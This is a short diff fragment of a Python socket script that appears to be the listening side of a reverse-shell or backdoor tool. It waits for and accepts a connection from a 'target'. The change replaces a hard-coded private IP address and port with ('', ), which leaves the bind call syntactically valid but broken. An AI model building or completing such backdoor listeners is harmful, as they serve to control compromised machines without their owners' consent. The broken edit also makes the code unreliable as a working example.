@@ -56,7 +56,7 @@ def target_communication():
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('192.168.223.133', 5555))
+sock.bind(('', ))
 print('[+] Listening For The Incoming Connections')
 sock.listen(5)
 target, ip = sock.accept()
